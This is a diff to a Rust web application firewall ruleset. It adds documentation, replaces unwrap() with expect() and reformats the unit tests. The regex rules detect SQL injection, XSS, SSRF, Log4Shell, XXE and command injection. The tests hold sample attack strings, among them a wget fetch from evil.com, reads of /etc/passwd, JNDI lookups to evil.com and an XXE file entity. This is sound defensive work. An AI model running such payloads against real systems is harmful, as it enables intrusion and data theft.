@@ -33,6 +33,9 @@ pub enum RuleCategory {
 }
 
 impl RuleCategory {
+    /// Stable string identifier for the category, suitable for logs,
+    /// API payloads, and config files. Round-trips with the
+    /// [`std::str::FromStr`] impl.
     pub fn as_str(&self) -> &'static str {
         match self {
             Self::SqlInjection => "sql_injection",
@@ -71,6 +74,10 @@ impl std::str::FromStr for RuleCategory {
 }
 
 /// A single WAF rule with a precompiled regex pattern.
+///
+/// Built-in rules use a `'static` description and a CRS-style numeric
+/// `id` (e.g. `942100` for SQLi via UNION). The `pattern` is compiled
+/// once at startup and reused for every request.
 pub struct WafRule {
     /// Unique rule ID (CRS-style numbering).
     pub id: u32,
@@ -109,12 +116,22 @@ impl std::fmt::Debug for WafRule {
 }
 
 /// A compiled set of WAF rules ready for evaluation.
+///
+/// Built once at engine startup via [`RuleSet::default_crs`] and held
+/// immutable for the lifetime of the [`crate::engine::WafEngine`];
+/// per-rule enable/disable state lives separately on the engine so
+/// the compiled regexes can be shared without locking.
 pub struct RuleSet {
     rules: Vec<WafRule>,
 }
 
 impl RuleSet {
     /// Build the default OWASP CRS-inspired ruleset.
+    ///
+    /// Compiles every built-in regex pattern. Panics at startup if any
+    /// pattern is malformed - the patterns are constants vetted in
+    /// tests, so this is treated as a programming error rather than a
+    /// runtime condition.
     pub fn default_crs() -> Self {
         let rules = vec![
             // --- SQL Injection (CRS 942xxx) ---
@@ -145,7 +162,7 @@ impl RuleSet {
                 category: RuleCategory::SqlInjection,
                 pattern: Regex::new(
                     r"(?i)\b(sleep|benchmark|waitfor|delay|load_file|into\s+outfile|into\s+dumpfile)\b\s*\(",
-                ).unwrap(),
+                ).expect("CRS pattern is a compile-time constant and compiles"),
                 severity: 5,
             },
             WafRule {
@@ -154,7 +171,7 @@ impl RuleSet {
                 category: RuleCategory::SqlInjection,
                 pattern: Regex::new(
                     r"(?i)\b(drop|alter|truncate|create)\b\s+\b(table|database|index|view)\b",
-                ).unwrap(),
+                ).expect("CRS pattern is a compile-time constant and compiles"),
                 severity: 5,
             },
             WafRule {
@@ -178,7 +195,7 @@ impl RuleSet {
                 category: RuleCategory::Xss,
                 pattern: Regex::new(
                     r"(?i)\bon(error|load|click|mouse\w+|focus|blur|submit|change|key\w+)\s*=",
-                ).unwrap(),
+                ).expect("CRS pattern is a compile-time constant and compiles"),
                 severity: 4,
             },
             WafRule {
@@ -223,7 +240,7 @@ impl RuleSet {
                 category: RuleCategory::PathTraversal,
                 pattern: Regex::new(
                     r"(?i)/(etc/(passwd|shadow|hosts)|proc/self|\.env|\.git/config|wp-config\.php)",
-                ).unwrap(),
+                ).expect("CRS pattern is a compile-time constant and compiles"),
                 severity: 5,
             },
             WafRule {
@@ -270,7 +287,7 @@ impl RuleSet {
                 category: RuleCategory::SSRF,
                 pattern: Regex::new(
                     r"(?i)(169\.254\.169\.254|metadata\.google\.internal|100\.100\.100\.200)",
-                ).unwrap(),
+                ).expect("CRS pattern is a compile-time constant and compiles"),
                 severity: 5,
             },
             WafRule {
@@ -279,7 +296,7 @@ impl RuleSet {
                 category: RuleCategory::SSRF,
                 pattern: Regex::new(
                     r"(?i)(https?://(localhost|127\.0\.0\.1|0\.0\.0\.0|\[::1\]|0x7f))",
-                ).unwrap(),
+                ).expect("CRS pattern is a compile-time constant and compiles"),
                 severity: 5,
             },
             WafRule {
@@ -288,7 +305,7 @@ impl RuleSet {
                 category: RuleCategory::SSRF,
                 pattern: Regex::new(
                     r"(?i)(file|gopher|dict|ftp|ldap|tftp)://"
-                ).unwrap(),
+                ).expect("CRS pattern is a compile-time constant and compiles"),
                 severity: 5,
             },
             WafRule {
@@ -297,7 +314,7 @@ impl RuleSet {
                 category: RuleCategory::SSRF,
                 pattern: Regex::new(
                     r"(?i)https?://(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})[:/]",
-                ).unwrap(),
+                ).expect("CRS pattern is a compile-time constant and compiles"),
                 severity: 4,
             },
             // --- Log4Shell / JNDI Injection (CRS 944xxx) ---
@@ -307,7 +324,7 @@ impl RuleSet {
                 category: RuleCategory::LogInjection,
                 pattern: Regex::new(
                     r"(?i)\$\{(\$\{.*\}|jndi|lower|upper|env|sys|date|java).*[:/]",
-                ).unwrap(),
+                ).expect("CRS pattern is a compile-time constant and compiles"),
                 severity: 5,
             },
             WafRule {
@@ -316,7 +333,7 @@ impl RuleSet {
                 category: RuleCategory::LogInjection,
                 pattern: Regex::new(
                     r"(?i)jndi\s*:\s*(ldap|ldaps|rmi|dns|iiop|corba|nds|http)s?\s*:",
-                ).unwrap(),
+                ).expect("CRS pattern is a compile-time constant and compiles"),
                 severity: 5,
             },
             // --- XXE (CRS 936xxx) ---
@@ -326,7 +343,7 @@ impl RuleSet {
                 category: RuleCategory::XXE,
                 pattern: Regex::new(
                     r"(?i)<!\s*(DOCTYPE|ENTITY)[^>]*(SYSTEM|PUBLIC)",
-                ).unwrap(),
+                ).expect("CRS pattern is a compile-time constant and compiles"),
                 severity: 5,
             },
             WafRule {
@@ -335,7 +352,7 @@ impl RuleSet {
                 category: RuleCategory::XXE,
                 pattern: Regex::new(
                     r#"(?i)<!ENTITY\s+\S+\s+SYSTEM\s+['"]"#,
-                ).unwrap(),
+                ).expect("CRS pattern is a compile-time constant and compiles"),
                 severity: 5,
             },
             // --- SSTI (Server-Side Template Injection, 948xxx) ---
@@ -345,7 +362,7 @@ impl RuleSet {
                 category: RuleCategory::SSTI,
                 pattern: Regex::new(
                     r"(?i)\{\{.*?(__|config|request|self|cycler|joiner|lipsum|namespace)\b",
-                ).unwrap(),
+                ).expect("CRS pattern is a compile-time constant and compiles"),
                 severity: 5,
             },
             WafRule {
@@ -354,7 +371,7 @@ impl RuleSet {
                 category: RuleCategory::SSTI,
                 pattern: Regex::new(
                     r"(?i)(#\{|<%=?|<\?=)\s*.*?(exec|system|Runtime|Process)",
-                ).unwrap(),
+                ).expect("CRS pattern is a compile-time constant and compiles"),
                 severity: 4,
             },
             // --- Prototype Pollution (949xxx) ---
@@ -364,7 +381,7 @@ impl RuleSet {
                 category: RuleCategory::PrototypePollution,
                 pattern: Regex::new(
                     r#"(?i)(__proto__|constructor\s*\[\s*["']prototype["']\]|prototype\s*\.\s*(constructor|polluted))"#,
-                ).unwrap(),
+                ).expect("CRS pattern is a compile-time constant and compiles"),
                 severity: 4,
             },
             // --- Additional SSRF evasion ---
@@ -374,7 +391,7 @@ impl RuleSet {
                 category: RuleCategory::SSRF,
                 pattern: Regex::new(
                     r"(?i)\{\s*__schema\s*\{|\bintrospectionQuery\b|\b__type\s*\(",
-                ).unwrap(),
+                ).expect("CRS pattern is a compile-time constant and compiles"),
                 severity: 3,
             },
             WafRule {
@@ -383,7 +400,7 @@ impl RuleSet {
                 category: RuleCategory::SSRF,
                 pattern: Regex::new(
                     r"(?i)https?://(0177\.0+\.0+\.0*1|0x7f[0-9a-f]*|2130706433|017700000001)\b",
-                ).unwrap(),
+                ).expect("CRS pattern is a compile-time constant and compiles"),
                 severity: 5,
             },
             // --- Additional Command Injection evasion ---
@@ -393,7 +410,7 @@ impl RuleSet {
                 category: RuleCategory::CommandInjection,
                 pattern: Regex::new(
                     r"(?i)\$\{IFS\}|\bIFS=|\b(printf|xxd|base64)\b\s+.*\|",
-                ).unwrap(),
+                ).expect("CRS pattern is a compile-time constant and compiles"),
                 severity: 4,
             },
             // --- Additional Protocol Violations ---
@@ -403,7 +420,7 @@ impl RuleSet {
                 category: RuleCategory::ProtocolViolation,
                 pattern: Regex::new(
                     r"(?i)(X-Forwarded-Host|X-Original-URL|X-Rewrite-URL)\s*:.*[;&|<>]",
-                ).unwrap(),
+                ).expect("CRS pattern is a compile-time constant and compiles"),
                 severity: 3,
             },
             WafRule {
@@ -412,7 +429,7 @@ impl RuleSet {
                 category: RuleCategory::ProtocolViolation,
                 pattern: Regex::new(
                     r"(?i)(redirect|url|next|return|goto|dest)\s*=\s*https?%3a%2f%2f",
-                ).unwrap(),
+                ).expect("CRS pattern is a compile-time constant and compiles"),
                 severity: 3,
             },
             // --- Spring4Shell / Java EL (944xxx) ---
@@ -422,7 +439,7 @@ impl RuleSet {
                 category: RuleCategory::LogInjection,
                 pattern: Regex::new(
                     r"(?i)(class\.module\.classLoader|springframework\.beans\.factory|java\.lang\.Runtime)",
-                ).unwrap(),
+                ).expect("CRS pattern is a compile-time constant and compiles"),
                 severity: 5,
             },
             // --- Additional SQL Injection (modern DBs) ---
@@ -432,7 +449,7 @@ impl RuleSet {
                 category: RuleCategory::SqlInjection,
                 pattern: Regex::new(
                     r"(?i)\b(extractvalue|updatexml|xmltype|json_keys|json_extract)\b\s*\(",
-                ).unwrap(),
+                ).expect("CRS pattern is a compile-time constant and compiles"),
                 severity: 4,
             },
             // --- SQL Injection: auth bypass & evasion ---
@@ -442,7 +459,7 @@ impl RuleSet {
                 category: RuleCategory::SqlInjection,
                 pattern: Regex::new(
                     r"(?i)('|%27)\s*(or|and)\s*('|%27|\d+\s*=\s*\d+|true|1\s*--|'\s*=\s*')",
-                ).unwrap(),
+                ).expect("CRS pattern is a compile-time constant and compiles"),
                 severity: 5,
             },
             WafRule {
@@ -451,7 +468,7 @@ impl RuleSet {
                 category: RuleCategory::SqlInjection,
                 pattern: Regex::new(
                     r"(?i)\b(information_schema|sys\.(tables|columns|objects)|pg_catalog|pg_tables|sqlite_master|mysql\.user)\b",
-                ).unwrap(),
+                ).expect("CRS pattern is a compile-time constant and compiles"),
                 severity: 4,
             },
             WafRule {
@@ -460,7 +477,7 @@ impl RuleSet {
                 category: RuleCategory::SqlInjection,
                 pattern: Regex::new(
                     r"(?i)\b(char|chr|concat|concat_ws|hex|unhex|conv)\s*\(\s*\d+",
-                ).unwrap(),
+                ).expect("CRS pattern is a compile-time constant and compiles"),
                 severity: 4,
             },
             // --- NoSQL Injection ---
@@ -470,7 +487,7 @@ impl RuleSet {
                 category: RuleCategory::SqlInjection,
                 pattern: Regex::new(
                     r#"(?i)(\$(?:ne|eq|gt|lt|gte|lte|in|nin|regex|exists|where|or|and|not|nor)\b|\{\s*["\']?\$(?:gt|ne|regex|where))"#,
-                ).unwrap(),
+                ).expect("CRS pattern is a compile-time constant and compiles"),
                 severity: 5,
             },
             // --- Additional XSS ---
@@ -480,7 +497,7 @@ impl RuleSet {
                 category: RuleCategory::Xss,
                 pattern: Regex::new(
                     r"(?i)\b(eval|settimeout|setinterval|function|constructor)\s*\(",
-                ).unwrap(),
+                ).expect("CRS pattern is a compile-time constant and compiles"),
                 severity: 5,
             },
             WafRule {
@@ -489,7 +506,7 @@ impl RuleSet {
                 category: RuleCategory::Xss,
                 pattern: Regex::new(
                     r"(?i)(atob|btoa)\s*\(|data\s*:\s*[^;]*;base64\s*,",
-                ).unwrap(),
+                ).expect("CRS pattern is a compile-time constant and compiles"),
                 severity: 4,
             },
             // --- Backup/sensitive file access ---
@@ -499,7 +516,7 @@ impl RuleSet {
                 category: RuleCategory::PathTraversal,
                 pattern: Regex::new(
                     r"(?i)\.(bak|backup|old|orig|save|swp|swo|tmp|temp|dist|copy|sql|tar\.gz|zip|rar|7z|log|conf|cfg|ini)\s*$",
-                ).unwrap(),
+                ).expect("CRS pattern is a compile-time constant and compiles"),
                 severity: 5,
             },
             // --- Windows command injection ---
@@ -509,7 +526,7 @@ impl RuleSet {
                 category: RuleCategory::CommandInjection,
                 pattern: Regex::new(
                     r"(?i)\b(powershell|cmd\.exe|certutil|bitsadmin|mshta|wscript|cscript|regsvr32|rundll32)\b",
-                ).unwrap(),
+                ).expect("CRS pattern is a compile-time constant and compiles"),
                 severity: 5,
             },
             // --- HTTP request smuggling ---
@@ -519,7 +536,7 @@ impl RuleSet {
                 category: RuleCategory::ProtocolViolation,
                 pattern: Regex::new(
                     r"(?i)(transfer-encoding\s*:.*chunked.*chunked|transfer-encoding\s*:.*,|content-length.*transfer-encoding|transfer-encoding.*content-length)",
-                ).unwrap(),
+                ).expect("CRS pattern is a compile-time constant and compiles"),
                 severity: 5,
             },
             // --- Scanner/bot detection ---
@@ -529,7 +546,7 @@ impl RuleSet {
                 category: RuleCategory::ProtocolViolation,
                 pattern: Regex::new(
                     r"(?i)(nikto|sqlmap|nmap|masscan|dirbuster|gobuster|feroxbuster|nuclei|wpscan|acunetix|nessus|burpsuite|zgrab|httpx|subfinder)",
-                ).unwrap(),
+                ).expect("CRS pattern is a compile-time constant and compiles"),
                 severity: 3,
             },
             // --- Deserialization attacks ---
@@ -539,7 +556,7 @@ impl RuleSet {
                 category: RuleCategory::LogInjection,
                 pattern: Regex::new(
                     r#"(?i)(O:\d+:"[^"]+"|rO0ABX|aced0005|java\.lang\.(ProcessBuilder|Runtime)|php://input|php://filter)"#,
-                ).unwrap(),
+                ).expect("CRS pattern is a compile-time constant and compiles"),
                 severity: 5,
             },
             // --- HTTP method abuse ---
@@ -549,7 +566,7 @@ impl RuleSet {
                 category: RuleCategory::ProtocolViolation,
                 pattern: Regex::new(
                     r"(?i)^(TRACE|TRACK|CONNECT|DEBUG|PROPFIND|PROPPATCH|MKCOL|COPY|MOVE|LOCK|UNLOCK)\s",
-                ).unwrap(),
+                ).expect("CRS pattern is a compile-time constant and compiles"),
                 severity: 3,
             },
         ];
@@ -606,7 +623,11 @@ mod tests {
     #[test]
     fn test_sqli_union_select() {
         let rs = RuleSet::default_crs();
-        let rule = rs.rules().iter().find(|r| r.id == 942100).unwrap();
+        let rule = rs
+            .rules()
+            .iter()
+            .find(|r| r.id == 942100)
+            .expect("test setup: rule 942100 must exist in CRS ruleset");
         assert!(rule.pattern.is_match("1 UNION SELECT * FROM users"));
         assert!(rule.pattern.is_match("1 union  select password from admin"));
         assert!(!rule.pattern.is_match("trade union membership"));
@@ -615,7 +636,11 @@ mod tests {
     #[test]
     fn test_sqli_comment_sequence() {
         let rs = RuleSet::default_crs();
-        let rule = rs.rules().iter().find(|r| r.id == 942110).unwrap();
+        let rule = rs
+            .rules()
+            .iter()
+            .find(|r| r.id == 942110)
+            .expect("test setup: rule 942110 must exist in CRS ruleset");
         assert!(rule.pattern.is_match("admin' --"));
         assert!(rule.pattern.is_match("admin' #"));
         assert!(rule.pattern.is_match("admin' /*"));
@@ -624,7 +649,11 @@ mod tests {
     #[test]
     fn test_sqli_or_equals() {
         let rs = RuleSet::default_crs();
-        let rule = rs.rules().iter().find(|r| r.id == 942120).unwrap();
+        let rule = rs
+            .rules()
+            .iter()
+            .find(|r| r.id == 942120)
+            .expect("test setup: rule 942120 must exist in CRS ruleset");
         assert!(rule.pattern.is_match("' OR 1=1"));
         assert!(rule.pattern.is_match("' and 2=2"));
         assert!(!rule.pattern.is_match("apples or oranges"));
@@ -633,7 +662,11 @@ mod tests {
     #[test]
     fn test_sqli_dangerous_functions() {
         let rs = RuleSet::default_crs();
-        let rule = rs.rules().iter().find(|r| r.id == 942130).unwrap();
+        let rule = rs
+            .rules()
+            .iter()
+            .find(|r| r.id == 942130)
+            .expect("test setup: rule 942130 must exist in CRS ruleset");
         assert!(rule.pattern.is_match("SLEEP(5)"));
         assert!(rule.pattern.is_match("benchmark(1000000,md5('test'))"));
         assert!(rule.pattern.is_match("LOAD_FILE('/etc/passwd')"));
@@ -642,7 +675,11 @@ mod tests {
     #[test]
     fn test_sqli_ddl_statements() {
         let rs = RuleSet::default_crs();
-        let rule = rs.rules().iter().find(|r| r.id == 942140).unwrap();
+        let rule = rs
+            .rules()
+            .iter()
+            .find(|r| r.id == 942140)
+            .expect("test setup: rule 942140 must exist in CRS ruleset");
         assert!(rule.pattern.is_match("DROP TABLE users"));
         assert!(rule.pattern.is_match("alter table sessions"));
         assert!(rule.pattern.is_match("CREATE DATABASE pwned"));
@@ -651,7 +688,11 @@ mod tests {
     #[test]
     fn test_sqli_stacked_queries() {
         let rs = RuleSet::default_crs();
-        let rule = rs.rules().iter().find(|r| r.id == 942150).unwrap();
+        let rule = rs
+            .rules()
+            .iter()
+            .find(|r| r.id == 942150)
+            .expect("test setup: rule 942150 must exist in CRS ruleset");
         assert!(rule.pattern.is_match("; SELECT * FROM users"));
         assert!(rule.pattern.is_match(";drop table users"));
     }
@@ -661,7 +702,11 @@ mod tests {
     #[test]
     fn test_xss_script_tag() {
         let rs = RuleSet::default_crs();
-        let rule = rs.rules().iter().find(|r| r.id == 941100).unwrap();
+        let rule = rs
+            .rules()
+            .iter()
+            .find(|r| r.id == 941100)
+            .expect("test setup: rule 941100 must exist in CRS ruleset");
         assert!(rule.pattern.is_match("<script>alert(1)</script>"));
         assert!(rule.pattern.is_match("<SCRIPT src=evil.js>"));
         assert!(!rule.pattern.is_match("noscript"));
@@ -670,7 +715,11 @@ mod tests {
     #[test]
     fn test_xss_event_handler() {
         let rs = RuleSet::default_crs();
-        let rule = rs.rules().iter().find(|r| r.id == 941110).unwrap();
+        let rule = rs
+            .rules()
+            .iter()
+            .find(|r| r.id == 941110)
+            .expect("test setup: rule 941110 must exist in CRS ruleset");
         assert!(rule.pattern.is_match("onerror=alert(1)"));
         assert!(rule.pattern.is_match("onload=fetch('http://evil')"));
         assert!(rule.pattern.is_match("ONCLICK=steal()"));
@@ -679,7 +728,11 @@ mod tests {
     #[test]
     fn test_xss_javascript_uri() {
         let rs = RuleSet::default_crs();
-        let rule = rs.rules().iter().find(|r| r.id == 941120).unwrap();
+        let rule = rs
+            .rules()
+            .iter()
+            .find(|r| r.id == 941120)
+            .expect("test setup: rule 941120 must exist in CRS ruleset");
         assert!(rule.pattern.is_match("javascript:alert(1)"));
         assert!(rule.pattern.is_match("JAVASCRIPT : void(0)"));
     }
@@ -687,7 +740,11 @@ mod tests {
     #[test]
     fn test_xss_iframe() {
         let rs = RuleSet::default_crs();
-        let rule = rs.rules().iter().find(|r| r.id == 941140).unwrap();
+        let rule = rs
+            .rules()
+            .iter()
+            .find(|r| r.id == 941140)
+            .expect("test setup: rule 941140 must exist in CRS ruleset");
         assert!(rule.pattern.is_match("<iframe src=evil.com>"));
         assert!(rule.pattern.is_match("<OBJECT data=x>"));
         assert!(rule.pattern.is_match("<embed src=x>"));
@@ -698,7 +755,11 @@ mod tests {
     #[test]
     fn test_path_traversal_dot_dot() {
         let rs = RuleSet::default_crs();
-        let rule = rs.rules().iter().find(|r| r.id == 930100).unwrap();
+        let rule = rs
+            .rules()
+            .iter()
+            .find(|r| r.id == 930100)
+            .expect("test setup: rule 930100 must exist in CRS ruleset");
         assert!(rule.pattern.is_match("../../../etc/passwd"));
         assert!(rule.pattern.is_match("..\\windows\\system32"));
         assert!(rule.pattern.is_match("%2e%2e/"));
@@ -708,7 +769,11 @@ mod tests {
     #[test]
     fn test_path_traversal_sensitive_files() {
         let rs = RuleSet::default_crs();
-        let rule = rs.rules().iter().find(|r| r.id == 930110).unwrap();
+        let rule = rs
+            .rules()
+            .iter()
+            .find(|r| r.id == 930110)
+            .expect("test setup: rule 930110 must exist in CRS ruleset");
         assert!(rule.pattern.is_match("/etc/passwd"));
         assert!(rule.pattern.is_match("/etc/shadow"));
         assert!(rule.pattern.is_match("/proc/self"));
@@ -719,7 +784,11 @@ mod tests {
     #[test]
     fn test_path_traversal_null_byte() {
         let rs = RuleSet::default_crs();
-        let rule = rs.rules().iter().find(|r| r.id == 930120).unwrap();
+        let rule = rs
+            .rules()
+            .iter()
+            .find(|r| r.id == 930120)
+            .expect("test setup: rule 930120 must exist in CRS ruleset");
         assert!(rule.pattern.is_match("file.php%00.jpg"));
     }
 
@@ -728,7 +797,11 @@ mod tests {
     #[test]
     fn test_cmdi_shell_operators() {
         let rs = RuleSet::default_crs();
-        let rule = rs.rules().iter().find(|r| r.id == 932100).unwrap();
+        let rule = rs
+            .rules()
+            .iter()
+            .find(|r| r.id == 932100)
+            .expect("test setup: rule 932100 must exist in CRS ruleset");
         assert!(rule.pattern.is_match("; cat /etc/passwd"));
         assert!(rule.pattern.is_match("| whoami"));
         assert!(rule.pattern.is_match("& wget http://evil.com/shell"));
@@ -737,7 +810,11 @@ mod tests {
     #[test]
     fn test_cmdi_backtick() {
         let rs = RuleSet::default_crs();
-        let rule = rs.rules().iter().find(|r| r.id == 932110).unwrap();
+        let rule = rs
+            .rules()
+            .iter()
+            .find(|r| r.id == 932110)
+            .expect("test setup: rule 932110 must exist in CRS ruleset");
         assert!(rule.pattern.is_match("`id`"));
         assert!(rule.pattern.is_match("$(cat /etc/passwd)"));
     }
@@ -747,7 +824,11 @@ mod tests {
     #[test]
     fn test_crlf_injection() {
         let rs = RuleSet::default_crs();
-        let rule = rs.rules().iter().find(|r| r.id == 920110).unwrap();
+        let rule = rs
+            .rules()
+            .iter()
+            .find(|r| r.id == 920110)
+            .expect("test setup: rule 920110 must exist in CRS ruleset");
         assert!(rule.pattern.is_match("header%0d%0ainjected: value"));
         assert!(rule.pattern.is_match("value%0d%0aSet-Cookie: evil"));
         assert!(!rule.pattern.is_match("normal header value"));
@@ -758,7 +839,11 @@ mod tests {
     #[test]
     fn test_ssrf_cloud_metadata() {
         let rs = RuleSet::default_crs();
-        let rule = rs.rules().iter().find(|r| r.id == 934100).unwrap();
+        let rule = rs
+            .rules()
+            .iter()
+            .find(|r| r.id == 934100)
+            .expect("test setup: rule 934100 must exist in CRS ruleset");
         assert!(rule
             .pattern
             .is_match("http://169.254.169.254/latest/meta-data/"));
@@ -771,7 +856,11 @@ mod tests {
     #[test]
     fn test_ssrf_localhost() {
         let rs = RuleSet::default_crs();
-        let rule = rs.rules().iter().find(|r| r.id == 934110).unwrap();
+        let rule = rs
+            .rules()
+            .iter()
+            .find(|r| r.id == 934110)
+            .expect("test setup: rule 934110 must exist in CRS ruleset");
         assert!(rule.pattern.is_match("http://localhost/admin"));
         assert!(rule.pattern.is_match("http://127.0.0.1:8080/"));
         assert!(rule.pattern.is_match("http://[::1]/secret"));
@@ -782,7 +871,11 @@ mod tests {
     #[test]
     fn test_ssrf_dangerous_scheme() {
         let rs = RuleSet::default_crs();
-        let rule = rs.rules().iter().find(|r| r.id == 934120).unwrap();
+        let rule = rs
+            .rules()
+            .iter()
+            .find(|r| r.id == 934120)
+            .expect("test setup: rule 934120 must exist in CRS ruleset");
         assert!(rule.pattern.is_match("file:///etc/passwd"));
         assert!(rule.pattern.is_match("gopher://evil.com/_GET"));
         assert!(rule.pattern.is_match("dict://evil.com/info"));
@@ -793,7 +886,11 @@ mod tests {
     #[test]
     fn test_ssrf_internal_network() {
         let rs = RuleSet::default_crs();
-        let rule = rs.rules().iter().find(|r| r.id == 934130).unwrap();
+        let rule = rs
+            .rules()
+            .iter()
+            .find(|r| r.id == 934130)
+            .expect("test setup: rule 934130 must exist in CRS ruleset");
         assert!(rule.pattern.is_match("http://10.0.0.1:8080/admin"));
         assert!(rule.pattern.is_match("http://172.16.0.1/"));
         assert!(rule.pattern.is_match("http://192.168.1.1/"));
@@ -805,7 +902,11 @@ mod tests {
     #[test]
     fn test_log4shell_jndi() {
         let rs = RuleSet::default_crs();
-        let rule = rs.rules().iter().find(|r| r.id == 944100).unwrap();
+        let rule = rs
+            .rules()
+            .iter()
+            .find(|r| r.id == 944100)
+            .expect("test setup: rule 944100 must exist in CRS ruleset");
         assert!(rule.pattern.is_match("${jndi:ldap://evil.com/a}"));
         assert!(rule.pattern.is_match("${${lower:j}ndi:ldap://evil.com}"));
         assert!(rule.pattern.is_match("${jndi:rmi://evil.com/obj}"));
@@ -815,7 +916,11 @@ mod tests {
     #[test]
     fn test_log4shell_jndi_protocol() {
         let rs = RuleSet::default_crs();
-        let rule = rs.rules().iter().find(|r| r.id == 944110).unwrap();
+        let rule = rs
+            .rules()
+            .iter()
+            .find(|r| r.id == 944110)
+            .expect("test setup: rule 944110 must exist in CRS ruleset");
         assert!(rule.pattern.is_match("jndi:ldap://evil.com"));
         assert!(rule.pattern.is_match("jndi:rmi://evil.com"));
         assert!(rule.pattern.is_match("jndi:dns://evil.com"));
@@ -827,7 +932,11 @@ mod tests {
     #[test]
     fn test_xxe_doctype() {
         let rs = RuleSet::default_crs();
-        let rule = rs.rules().iter().find(|r| r.id == 936100).unwrap();
+        let rule = rs
+            .rules()
+            .iter()
+            .find(|r| r.id == 936100)
+            .expect("test setup: rule 936100 must exist in CRS ruleset");
         assert!(rule
             .pattern
             .is_match("<!DOCTYPE foo SYSTEM \"http://evil.com/xxe.dtd\">"));
@@ -840,7 +949,11 @@ mod tests {
     #[test]
     fn test_xxe_entity() {
         let rs = RuleSet::default_crs();
-        let rule = rs.rules().iter().find(|r| r.id == 936110).unwrap();
+        let rule = rs
+            .rules()
+            .iter()
+            .find(|r| r.id == 936110)
+            .expect("test setup: rule 936110 must exist in CRS ruleset");
         assert!(rule
             .pattern
             .is_match("<!ENTITY xxe SYSTEM \"file:///etc/passwd\">"));
@@ -872,7 +985,11 @@ mod tests {
     #[test]
     fn test_sqli_auth_bypass() {
         let rs = RuleSet::default_crs();
-        let rule = rs.rules().iter().find(|r| r.id == 942170).unwrap();
+        let rule = rs
+            .rules()
+            .iter()
+            .find(|r| r.id == 942170)
+            .expect("test setup: rule 942170 must exist in CRS ruleset");
         assert!(rule.pattern.is_match("' OR '1'='1"));
         assert!(rule.pattern.is_match("' or true--"));
         assert!(rule.pattern.is_match("%27 OR 1=1"));
@@ -882,8 +999,14 @@ mod tests {
     #[test]
     fn test_sqli_info_schema() {
         let rs = RuleSet::default_crs();
-        let rule = rs.rules().iter().find(|r| r.id == 942180).unwrap();
-        assert!(rule.pattern.is_match("SELECT * FROM information_schema.tables"));
+        let rule = rs
+            .rules()
+            .iter()
+            .find(|r| r.id == 942180)
+            .expect("test setup: rule 942180 must exist in CRS ruleset");
+        assert!(rule
+            .pattern
+            .is_match("SELECT * FROM information_schema.tables"));
         assert!(rule.pattern.is_match("sqlite_master"));
         assert!(rule.pattern.is_match("pg_catalog"));
         assert!(!rule.pattern.is_match("SELECT name FROM users"));
@@ -892,7 +1015,11 @@ mod tests {
     #[test]
     fn test_sqli_encoding_evasion() {
         let rs = RuleSet::default_crs();
-        let rule = rs.rules().iter().find(|r| r.id == 942190).unwrap();
+        let rule = rs
+            .rules()
+            .iter()
+            .find(|r| r.id == 942190)
+            .expect("test setup: rule 942190 must exist in CRS ruleset");
         assert!(rule.pattern.is_match("CHAR(0x61,0x64)"));
         assert!(rule.pattern.is_match("concat(0x7e,version())"));
         assert!(!rule.pattern.is_match("character set utf8"));
@@ -901,7 +1028,11 @@ mod tests {
     #[test]
     fn test_nosql_injection() {
         let rs = RuleSet::default_crs();
-        let rule = rs.rules().iter().find(|r| r.id == 942200).unwrap();
+        let rule = rs
+            .rules()
+            .iter()
+            .find(|r| r.id == 942200)
+            .expect("test setup: rule 942200 must exist in CRS ruleset");
         assert!(rule.pattern.is_match(r#"{"$gt":""}"#));
         assert!(rule.pattern.is_match("$where"));
         assert!(rule.pattern.is_match("$ne"));
@@ -911,7 +1042,11 @@ mod tests {
     #[test]
     fn test_xss_eval() {
         let rs = RuleSet::default_crs();
-        let rule = rs.rules().iter().find(|r| r.id == 941160).unwrap();
+        let rule = rs
+            .rules()
+            .iter()
+            .find(|r| r.id == 941160)
+            .expect("test setup: rule 941160 must exist in CRS ruleset");
         assert!(rule.pattern.is_match("eval('alert(1)')"));
         assert!(rule.pattern.is_match("setTimeout(payload)"));
         assert!(rule.pattern.is_match("constructor('return this')"));
@@ -921,7 +1056,11 @@ mod tests {
     #[test]
     fn test_xss_base64() {
         let rs = RuleSet::default_crs();
-        let rule = rs.rules().iter().find(|r| r.id == 941170).unwrap();
+        let rule = rs
+            .rules()
+            .iter()
+            .find(|r| r.id == 941170)
+            .expect("test setup: rule 941170 must exist in CRS ruleset");
         assert!(rule.pattern.is_match("atob('YWxlcnQ=')"));
         assert!(rule.pattern.is_match("data:text/html;base64,PHNjcmlwdD4="));
         assert!(!rule.pattern.is_match("database connection"));
@@ -930,7 +1069,11 @@ mod tests {
     #[test]
     fn test_backup_file_access() {
         let rs = RuleSet::default_crs();
-        let rule = rs.rules().iter().find(|r| r.id == 930130).unwrap();
+        let rule = rs
+            .rules()
+            .iter()
+            .find(|r| r.id == 930130)
+            .expect("test setup: rule 930130 must exist in CRS ruleset");
         assert!(rule.pattern.is_match("/config.bak"));
         assert!(rule.pattern.is_match("/dump.sql"));
         assert!(rule.pattern.is_match("/site.tar.gz"));
@@ -940,7 +1083,11 @@ mod tests {
     #[test]
     fn test_powershell_injection() {
         let rs = RuleSet::default_crs();
-        let rule = rs.rules().iter().find(|r| r.id == 932130).unwrap();
+        let rule = rs
+            .rules()
+            .iter()
+            .find(|r| r.id == 932130)
+            .expect("test setup: rule 932130 must exist in CRS ruleset");
         assert!(rule.pattern.is_match("powershell -enc"));
         assert!(rule.pattern.is_match("certutil -urlcache"));
         assert!(!rule.pattern.is_match("power supply"));
@@ -949,15 +1096,25 @@ mod tests {
     #[test]
     fn test_request_smuggling() {
         let rs = RuleSet::default_crs();
-        let rule = rs.rules().iter().find(|r| r.id == 920140).unwrap();
+        let rule = rs
+            .rules()
+            .iter()
+            .find(|r| r.id == 920140)
+            .expect("test setup: rule 920140 must exist in CRS ruleset");
         assert!(rule.pattern.is_match("transfer-encoding: chunked chunked"));
-        assert!(rule.pattern.is_match("transfer-encoding: chunked, identity"));
+        assert!(rule
+            .pattern
+            .is_match("transfer-encoding: chunked, identity"));
     }
 
     #[test]
     fn test_scanner_detection() {
         let rs = RuleSet::default_crs();
-        let rule = rs.rules().iter().find(|r| r.id == 913100).unwrap();
+        let rule = rs
+            .rules()
+            .iter()
+            .find(|r| r.id == 913100)
+            .expect("test setup: rule 913100 must exist in CRS ruleset");
         assert!(rule.pattern.is_match("sqlmap/1.0"));
